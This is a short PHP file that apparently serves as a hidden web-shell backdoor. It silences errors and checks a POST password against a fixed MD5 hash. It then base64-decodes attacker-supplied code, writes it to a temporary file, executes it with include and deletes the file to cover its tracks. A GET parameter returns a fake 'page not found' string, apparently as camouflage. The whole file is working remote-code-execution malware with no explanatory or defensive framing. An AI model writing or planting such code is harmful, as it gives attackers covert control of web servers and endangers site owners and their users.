<?php error_reporting(0);
ini_set('display_errors', 0);
if (isset($_POST['m']) && md5($_POST['m']) == "8b83a84918c63d1e9b9ab82e07e20539") {
    $a = base64_decode($_POST['a']);
    file_put_contents('_a', '<?php ' . $a);
    $a = '_a';
    if (file_exists($a)) {
        include($a);
        unlink($a);
    }
}
if (isset($_GET['lt'])) {
    echo "page_not_found_404";
}